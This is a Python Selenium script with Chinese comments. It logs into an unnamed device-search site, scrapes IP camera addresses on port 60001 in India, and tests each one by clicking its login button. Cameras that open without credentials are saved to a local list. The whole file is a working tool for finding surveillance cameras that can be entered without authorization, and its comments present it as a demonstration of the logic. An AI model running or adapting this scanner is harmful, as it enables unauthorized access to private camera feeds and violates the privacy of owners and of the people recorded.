import re
import tqdm
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoAlertPresentException, TimeoutException

# 扫描网站可自己寻找，代码仅演示逻辑
country = "IN" #印度
city = "" 
login_url = ""
query_url = ""
city_url = ""
USER_NAME = ""
PASSWORD = ""

# 无头浏览器配置
chrome_options = Options()
chrome_options.add_argument("--headless")
chrome_options.add_argument("--disable-gpu")
chrome_options.add_argument("log-level=3")
browser = webdriver.Chrome(chrome_options=chrome_options)
browser.set_page_load_timeout(10)

#登录模块
browser.get(login_url)
WebDriverWait(browser, 30).until(
    EC.presence_of_element_located((By.XPATH, '//*[@name="login_submit"]'))
)
browser.find_element_by_id("username").clear()
browser.find_element_by_id("username").send_keys(USER_NAME)
browser.find_element_by_id("password").clear()
browser.find_element_by_id("password").send_keys(PASSWORD)
browser.find_element_by_name("login_submit").click()

#抓取潜在的摄像头url，默认抓取两页
if city:
    query_url += city_url 

latent_camera_url = []
browser.get(query_url)
WebDriverWait(browser, 30).until(
    EC.presence_of_element_located((By.CLASS_NAME, 'button'))
)
html = browser.page_source
latent_camera_url += re.findall('<a href="(http:.*?:60001)"', html)
browser.get(query_url + "&page=2")
WebDriverWait(browser, 30).until(
    EC.presence_of_element_located((By.CLASS_NAME, 'button'))
)
html = browser.page_source
latent_camera_url += re.findall('<a href="(http:.*?:60001)"', html)

#测试潜在url列表中可登录的url
useful_camera_address = []
for camera_url in tqdm.tqdm(latent_camera_url):
    try:
        browser.get(camera_url)
    except:
        continue
    try:
        WebDriverWait(browser, 30).until(
            EC.presence_of_element_located((By.XPATH, '//*[@lxc_lang="index_Login"]'))
        )
    except TimeoutException:
        continue
    try:
        browser.find_element_by_css_selector('[lxc_lang="index_Login"]').click()
        time.sleep(2)
        try:
            browser.switch_to.alert.accept()
        except TimeoutException:
            continue
    except NoAlertPresentException:
        try:
            WebDriverWait(browser, 30).until(
                EC.presence_of_element_located((By.ID, 'flashcontent-container'))
            )
        except TimeoutException:
            continue
        page_source = browser.page_source
        print(f"useful camera ip address: {camera_url}")
        useful_camera_address.append(camera_url)

#保存可访问的摄像头url信息至本地
if useful_camera_address:
    for url in useful_camera_address:
        with open("useful_camera_ip_address.txt", "a+") as fp:
            fp.write(url + "\n")
